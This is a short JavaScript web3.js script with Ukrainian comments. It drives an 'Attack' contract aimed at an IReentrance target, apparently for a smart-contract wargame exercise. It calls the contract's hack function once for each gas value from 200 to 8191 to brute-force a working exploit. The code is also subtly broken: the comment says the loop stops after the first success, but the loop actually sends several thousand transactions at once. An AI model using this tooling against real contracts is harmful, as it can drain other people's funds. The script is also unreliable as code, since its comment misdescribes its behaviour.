function run() {
    // ABI твого контракту Attack
    const contractABI = [
	{
		"inputs": [
			{
				"internalType": "contract IReentrance",
				"name": "_target",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "gas",
				"type": "uint256"
			}
		],
		"name": "hack",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];
    
    // Адреса твого контракту Attack
    const contractAddress = "0xAA90b7B478Ac31EBCc96551FEf5bEbeccdcD50c2";

    // Створюємо екземпляр контракту
    const attack = new web3.eth.Contract(contractABI, contractAddress);

    // Отримуємо акаунти
    web3.eth.getAccounts()
        .then((accounts) => {
            const sender = accounts[0]; // Використовуємо перший акаунт

            // Цикл від 200 до 8191
            for (let i = 200; i <= 8191; i++) {
                attack.methods.hack(i).send({
                    from: sender, // Виконання від імені цього акаунта
                    gas: 800000 // Вказуємо ліміт газу (можеш змінити)
                })
                .then((tx) => {
                    console.log("Gas required ->", tx.gasUsed.toString());
                    return; // Виходимо з циклу після першого успішного виклику
                })
                .catch((e) => {
                    // Помилки обробляємо тут (пропускаємо, якщо не спрацювало)
                });
            }
        })
        .catch((error) => {
            console.log("Error:", error);
        });
}

// Викликаємо функцію
run();
